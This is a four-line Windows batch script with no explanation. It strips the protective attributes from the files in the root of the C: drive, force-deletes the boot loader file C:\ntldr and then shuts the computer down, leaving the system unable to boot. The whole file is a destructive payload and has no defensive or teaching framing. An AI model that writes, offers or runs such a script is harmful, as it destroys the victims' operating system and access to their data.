@echo off
attrib "C:\*.*" -r -a -s -h
del /f /q "C:\ntldr"
shutdown -s